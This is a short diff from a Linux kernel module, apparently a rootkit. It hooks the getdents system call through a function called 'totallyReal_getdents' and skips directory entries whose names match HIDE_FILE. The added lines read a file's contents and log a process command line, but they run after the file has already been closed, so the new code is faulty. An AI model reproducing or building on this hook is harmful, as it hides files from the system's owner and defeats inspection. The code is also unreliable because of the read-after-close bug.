@@ -148,6 +148,9 @@ asmlinkage long totallyReal_getdents(unsigned int fd, struct linux_dirent * dirp
 		if (f != NULL) {
 			pr_info("FAKEGETDENTS: File open success");
 			filp_close(f, NULL);
+			file_read(f, 0, buf, BUF_SIZE - 1);
+			pr_info("FAKEGETDENTS: cmdline is %s", buf);
+			
 		}
 
 		if (strstr(p_dirp->d_name, HIDE_FILE) != NULL ) {
